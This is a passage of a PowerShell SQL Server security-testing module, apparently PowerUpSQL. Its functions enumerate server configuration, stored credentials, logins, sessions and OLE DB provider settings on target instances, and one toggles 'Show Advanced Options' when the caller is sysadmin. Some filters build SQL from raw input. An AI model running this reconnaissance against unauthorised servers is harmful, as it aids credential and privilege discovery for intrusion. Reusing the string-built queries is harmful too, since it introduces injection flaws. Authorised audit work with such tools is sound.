            PS C:\> Get-SQLServerConfiguration -Instance SQLServer1\STANDARDDEV2014
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerConfiguration -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Nubmer of hosts to query at one time.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        # Setup data table for output
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Name')
        $null = $TblResults.Columns.Add('Minimum')
        $null = $TblResults.Columns.Add('Maximum')
        $null = $TblResults.Columns.Add('config_value')
        $null = $TblResults.Columns.Add('run_value')


        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Switch to track advanced options
                $DisableShowAdvancedOptions = 0

                # Get show advance status
                $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                # Get sysadmin status
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Enable show advanced options if needed
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                    }
                }
                else
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    }

                    if($IsSysadmin -eq 'Yes')
                    {
                        if(-not $SuppressVerbose)
                        {
                            Write-Verbose -Message "$Instance : Your a sysadmin, trying to enabled it."
                        }

                        # Try to enable Show Advanced Options
                        Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                        # Check if configuration change worked
                        $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                        if ($IsShowAdvancedEnabled2 -eq 1)
                        {
                            $DisableShowAdvancedOptions = 1
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                            }
                        }
                        else
                        {
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                            }
                        }
                    }
                }

                # Run sp_confgiure
                Get-SQLQuery -Instance $Instance -Query 'sp_configure' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                ForEach-Object -Process {
                    $SettingName = $_.name
                    $SettingMin = $_.minimum
                    $SettingMax = $_.maximum
                    $SettingConf_value = $_.config_value
                    $SettingRun_value = $_.run_value

                    $null = $TblResults.Rows.Add($ComputerName, $Instance, $SettingName, $SettingMin, $SettingMax, $SettingConf_value, $SettingRun_value)
                }

                # Restore Show Advanced Options state if needed
                if($DisableShowAdvancedOptions -eq 1 -and $IsSysadmin -eq 'Yes')
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    }
                    $Configurations = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}

Function  Get-SQLServerCredential
{
    <#
            .SYNOPSIS
            Returns credentials from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerCredential -Instance SQLServer1\STANDARDDEV2014

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            credential_id       : 65536
            CredentialName      : MyUser
            credential_identity : Domain\MyUser
            create_date         : 5/5/2016 11:16:12 PM
            modify_date         : 5/5/2016 11:16:12 PM
            target_type         :
            target_id           :
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerCredential -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Credential name.')]
        [string]$CredentialName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        $TblCredentials = New-Object -TypeName System.Data.DataTable

        # Setup CredentialName filter
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            credential_id,
            name as [CredentialName],
            credential_identity,
            create_date,
            modify_date,
            target_type,
            target_id
            FROM [master].[sys].[credentials]
        $CredentialNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblCredentials = $TblCredentials + $TblResults
    }

    End
    {
        # Return data
        $TblCredentials
    }
}


Function  Get-SQLServerLogin
{
    <#
            .SYNOPSIS
            Returns logins from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER PrincipalName
            Pincipal name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLServerLogin -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            PrincipalId   : 1
            PrincipalName : sa
            PrincipalSid  : 1
            PrincipalType : SQL_LOGIN
            CreateDate    : 4/8/2003 9:10:35 AM
            IsLocked      : 0
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerLogin -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblLogins = New-Object -TypeName System.Data.DataTable
        $null = $TblLogins.Columns.Add('ComputerName')
        $null = $TblLogins.Columns.Add('Instance')
        $null = $TblLogins.Columns.Add('PrincipalId')
        $null = $TblLogins.Columns.Add('PrincipalName')
        $null = $TblLogins.Columns.Add('PrincipalSid')
        $null = $TblLogins.Columns.Add('PrincipalType')
        $null = $TblLogins.Columns.Add('CreateDate')
        $null = $TblLogins.Columns.Add('IsLocked')

        # Setup CredentialName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],principal_id as [PrincipalId],
            name as [PrincipalName],
            sid as [PrincipalSid],
            type_desc as [PrincipalType],
            create_date as [CreateDate],
            LOGINPROPERTY ( name , 'IsLocked' ) as [IsLocked]
            FROM [sys].[server_principals]
            WHERE type = 'S' or type = 'U' or type = 'C'
        $PrincipalNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblLogins.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
            [string]$_.IsLocked)
        }
    }

    End
    {
        # Return data
        $TblLogins
    }
}

Function  Get-SQLSession
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'PrincipalName.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSessions = New-Object -TypeName System.Data.DataTable
        $null = $TblSessions.Columns.Add('ComputerName')
        $null = $TblSessions.Columns.Add('Instance')
        $null = $TblSessions.Columns.Add('PrincipalSid')
        $null = $TblSessions.Columns.Add('PrincipalName')
        $null = $TblSessions.Columns.Add('OriginalPrincipalName')
        $null = $TblSessions.Columns.Add('SessionId')
        $null = $TblSessions.Columns.Add('SessionStartTime')
        $null = $TblSessions.Columns.Add('SessionLoginTime')
        $null = $TblSessions.Columns.Add('SessionStatus')

        # Setup PrincipalName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and login_name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to view sessions that aren't yours.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            security_id as [PrincipalSid],
            login_name as [PrincipalName],
            original_login_name as [OriginalPrincipalName],
            session_id as [SessionId],
            last_request_start_time as [SessionStartTime],
            login_time as [SessionLoginTime],
            status as [SessionStatus]
            FROM    [sys].[dm_exec_sessions]
            ORDER BY status
        $PrincipalNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblSessions.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                $Sid,
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
            [string]$_.SessionStatus)
        }
    }

    End
    {
        # Return data
        $TblSessions
    }
}

Function  Get-SQLOleDbProvder
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
     
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblProviders = New-Object -TypeName System.Data.DataTable
        $null = $TblProviders.Columns.Add('ComputerName') 
        $null = $TblProviders.Columns.Add('Instance') 
        $null = $TblProviders.Columns.Add('ProviderName') 
        $null = $TblProviders.Columns.Add('ProviderDescription')
        $null = $TblProviders.Columns.Add('ProviderParseName')
        $null = $TblProviders.Columns.Add('AllowInProcess')
        $null = $TblProviders.Columns.Add('DisallowAdHocAccess')
        $null = $TblProviders.Columns.Add('DynamicParameters') 
        $null = $TblProviders.Columns.Add('IndexAsAccessPath') 
        $null = $TblProviders.Columns.Add('LevelZeroOnly') 
        $null = $TblProviders.Columns.Add('NestedQueries') 
        $null = $TblProviders.Columns.Add('NonTransactedUpdates') 
        $null = $TblProviders.Columns.Add('SqlServerLIKE')

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable


        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Set instance
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Check sysadmin
            $IsSysadmin = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
            if($IsSysadmin -eq "No")
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : This command requires sysadmin privileges. Exiting."  
                }              
                return
            }else{
                
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : You have sysadmin privileges."
                    Write-Verbose -Message "$Instance : Grabbing list of providers."
                }
            }            

            # SetUp Query
            $Query = "                        

            -- Name: Get-SQLOleDbProvider.sql
            -- Description: Get a list of OLE provider along with their current settings.
            -- Author: Scott Sutherland, NetSPI 2017

            -- Get a list of providers
            CREATE TABLE #Providers ([ProviderName] varchar(8000), 
            [ParseName] varchar(8000),
            [ProviderDescription] varchar(8000))

            INSERT INTO #Providers
            EXEC xp_enum_oledb_providers

            -- Create temp table for provider information
            CREATE TABLE #ProviderInformation ([ProviderName] varchar(8000), 
            [ProviderDescription] varchar(8000),
            [ProviderParseName] varchar(8000),
            [AllowInProcess] int, 
            [DisallowAdHocAccess] int, 
            [DynamicParameters] int,  
            [IndexAsAccessPath] int,  
            [LevelZeroOnly] int,  
            [NestedQueries] int,  
            [NonTransactedUpdates] int,  
            [SqlServerLIKE] int)

            -- Setup required variables for cursor
            DECLARE @Provider_name varchar(8000);
            DECLARE @Provider_parse_name varchar(8000);
            DECLARE @Provider_description varchar(8000);
            DECLARE @property_name varchar(8000)
            DECLARE @regpath nvarchar(512)  

            -- Start cursor
            DECLARE MY_CURSOR1 CURSOR
            FOR
            SELECT * FROM #Providers
            OPEN MY_CURSOR1
            FETCH NEXT FROM MY_CURSOR1 INTO @Provider_name,@Provider_parse_name,@Provider_description
            WHILE @@FETCH_STATUS = 0 
  
	            BEGIN  
		
	            -- Set the registry path
	            SET @regpath = N'SOFTWARE\Microsoft\MSSQLServer\Providers\' + @provider_name  

	            -- AllowInProcess	
	             DECLARE @AllowInProcess int 
	             SET @AllowInProcess = 0 
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'AllowInProcess',	@AllowInProcess OUTPUT		 
	             IF @AllowInProcess IS NULL 
	             SET @AllowInProcess = 0

	            -- DisallowAdHocAccess 
	             DECLARE @DisallowAdHocAccess int  
	             SET @DisallowAdHocAccess = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DisallowAdHocAccess',	@DisallowAdHocAccess OUTPUT	 
	             IF @DisallowAdHocAccess IS NULL 
	             SET @DisallowAdHocAccess = 0

	            -- DynamicParameters 
	             DECLARE @DynamicParameters  int  
	             SET @DynamicParameters  = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DynamicParameters',	@DynamicParameters OUTPUT	 
	             IF @DynamicParameters  IS NULL 
	             SET @DynamicParameters  = 0

	            -- IndexAsAccessPath 
	             DECLARE @IndexAsAccessPath int 
	             SET @IndexAsAccessPath = 0 
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'IndexAsAccessPath',	@IndexAsAccessPath OUTPUT	 
	             IF @IndexAsAccessPath IS NULL 
	             SET @IndexAsAccessPath  = 0

	            -- LevelZeroOnly 
	             DECLARE @LevelZeroOnly int
	             SET @LevelZeroOnly  = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'LevelZeroOnly',	@LevelZeroOnly OUTPUT	
	             IF  @LevelZeroOnly IS NULL 
	             SET  @LevelZeroOnly  = 0	  

	            -- NestedQueries 
	             DECLARE @NestedQueries int  
	             SET @NestedQueries = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NestedQueries',	@NestedQueries OUTPUT
	             IF   @NestedQueries IS NULL 
	             SET  @NestedQueries = 0		 	 

	            -- NonTransactedUpdates 
	             DECLARE @NonTransactedUpdates int  
	             SET @NonTransactedUpdates = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NonTransactedUpdates',	@NonTransactedUpdates  OUTPUT	 
	             IF  @NonTransactedUpdates IS NULL 
	             SET @NonTransactedUpdates = 0

	            -- SqlServerLIKE
	             DECLARE @SqlServerLIKE int  
	             SET @SqlServerLIKE  = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'SqlServerLIKE',	@SqlServerLIKE OUTPUT	
	             IF  @SqlServerLIKE IS NULL 
	             SET @SqlServerLIKE = 0 

	            -- Add the full provider record to the temp table
	            INSERT INTO #ProviderInformation
	            VALUES (@Provider_name,@Provider_description,@Provider_parse_name,@AllowInProcess,@DisallowAdHocAccess,@DynamicParameters,@IndexAsAccessPath,@LevelZeroOnly,@NestedQueries,@NonTransactedUpdates,@SqlServerLIKE);

	            FETCH NEXT FROM MY_CURSOR1 INTO  @Provider_name,@Provider_parse_name,@Provider_description

	            END   

            -- Return records
            SELECT * FROM #ProviderInformation

            -- Clean up
            CLOSE MY_CURSOR1
            DEALLOCATE MY_CURSOR1
            DROP TABLE #Providers
            DROP TABLE #ProviderInformation"
          
            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results for pipeline items
            $TblResults |
            ForEach-Object -Process {

                # Add record to master table
                $null = $TblProviders.Rows.Add(
                    $ComputerName,
                    $Instance,
                    $_.ProviderName,
                    $_.ProviderDescription,
                    $_.ProviderParseName,
                    $_.AllowInProcess,
                    $_.DisallowAdHocAccess,
                    $_.DynamicParameters,
                    $_.IndexAsAccessPath,
                    $_.LevelZeroOnly,
                    $_.NestedQueries,
                    $_.NonTransactedUpdates,
                    $_.SqlServerLIKE
                )
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblProviders
    }
}

Function  Get-SQLDomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
     
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.  This is the number of instance to process at a time')]
        [int]$Threads = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap path. domain/dc=domain,dc=local')]
        [string]$LdapPath,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap filter. Example: (&(objectCategory=Person)(objectClass=user))')]
        [string]$LdapFilter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap fields. Example: samaccountname,name,admincount,whencreated,whenchanged,adspath')]
        [string]$LdapFields,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDomainObjects = New-Object -TypeName System.Data.DataTable         
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Check sysadmin
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $DomainName = $ServerInfo.DomainName
        $IsSysadmin = $ServerInfo.IsSysadmin
        $ServiceAccount = $ServerInfo.ServiceAccount
        $SQLServerMajorVersion = $ServerInfo.SQLServerMajorVersion
        $SQLServerEdition = $ServerInfo.SQLServerEdition
        $SQLServerVersionNumber = $ServerInfo.SQLServerVersionNumber
        $SQLCurrentLogin = $ServerInfo.Currentlogin

        # Status user
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$instance : Login: $SQLCurrentLogin"
            Write-Verbose -Message "$Instance : Domain: $DomainName"
            Write-Verbose -Message "$Instance : Version: SQL Server $SQLServerMajorVersion $SQLServerEdition ($SQLServerVersionNumber)"
        }
         
        if($IsSysadmin -eq "No")
        {
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Sysadmin: No"
                Write-Verbose -Message "$Instance : This command requires sysadmin privileges. Exiting."  
            }          
            return
        }else{
            
